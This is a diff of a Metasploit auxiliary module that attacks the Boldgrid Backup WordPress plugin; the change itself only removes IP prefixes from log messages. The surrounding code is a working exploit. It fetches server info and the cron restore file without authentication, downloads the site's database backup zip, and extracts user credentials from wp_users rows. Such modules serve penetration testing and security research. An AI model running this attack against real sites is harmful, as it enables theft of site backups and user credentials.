@@ -51,9 +51,9 @@ class MetasploitModule < Msf::Auxiliary
     unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)
       fail_with Failure::NotVulnerable, "#{ip} - A vulnerable version of Boldgrid Backup was not found"
     end
-    print_good("#{ip} - Vulnerable version of Boldgrid Backup detected")
+    print_good("Vulnerable version of Boldgrid Backup detected")
 
-    print_status("#{ip} - Obtaining Server Info")
+    print_status("Obtaining Server Info")
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'boldgrid-backup', 'cli', 'env-info.php')
@@ -70,7 +70,7 @@ class MetasploitModule < Msf::Auxiliary
     data.each do |k, v|
       output << "  #{k}: #{v}"
     end
-    print_good("#{ip} - \n#{output.join("\n")}")
+    print_good("\n#{output.join("\n")}")
     path = store_loot(
       'boldgrid-backup.server.info',
       'text/json',
@@ -78,9 +78,9 @@ class MetasploitModule < Msf::Auxiliary
       data,
       'env-info.json'
     )
-    print_good("#{ip} - File saved in: #{path}")
+    print_good("File saved in: #{path}")
 
-    print_status("#{ip} - Obtaining Backup List from Cron")
+    print_status("Obtaining Backup List from Cron")
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'boldgrid-backup', 'cron', 'restore-info.json')
@@ -98,7 +98,7 @@ class MetasploitModule < Msf::Auxiliary
     data.each do |k, v|
       output << "  #{k}: #{v}"
     end
-    print_good("#{ip} - \n#{output.join("\n")}")
+    print_good("\n#{output.join("\n")}")
     path = store_loot(
       'boldgrid-backup.backup.info',
       'text/json',
@@ -106,13 +106,13 @@ class MetasploitModule < Msf::Auxiliary
       data,
       'restore-info.json'
     )
-    print_good("#{ip} - File saved in: #{path}")
+    print_good("File saved in: #{path}")
     unless data['filepath']
-      print_bad("#{ip} - no file found")
+      print_bad("no file found")
     end
     # pull a url from the local file system path
     path = data['filepath'].sub(data['ABSPATH'], '')
-    print_status("#{ip} attempting download of #{path}")
+    print_status("attempting download of #{path}")
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, path)
@@ -127,7 +127,7 @@ class MetasploitModule < Msf::Auxiliary
       res.body,
       path.split('/').last
     )
-    print_good("#{ip} - Database backup (#{res.body.bytesize} bytes) saved in: #{path}")
+    print_good("Database backup (#{res.body.bytesize} bytes) saved in: #{path}")
 
     Zip::File.open(path) do |zip_file|
       # Handle entries one by one
@@ -135,7 +135,7 @@ class MetasploitModule < Msf::Auxiliary
         # Extract to file
         next unless entry.name.ends_with?('.sql')
 
-        print_status("#{ip} - Attempting to pull creds from #{entry}")
+        print_status("Attempting to pull creds from #{entry}")
         f = entry.get_input_stream.read
         f.split("\n").each do |l|
           next unless l.include?('INSERT INTO `wp_users` VALUES ')
@@ -168,6 +168,6 @@ class MetasploitModule < Msf::Auxiliary
         end
       end
     end
-    print_status("#{ip} - finished processing backup zip")
+    print_status("finished processing backup zip")
   end
 end
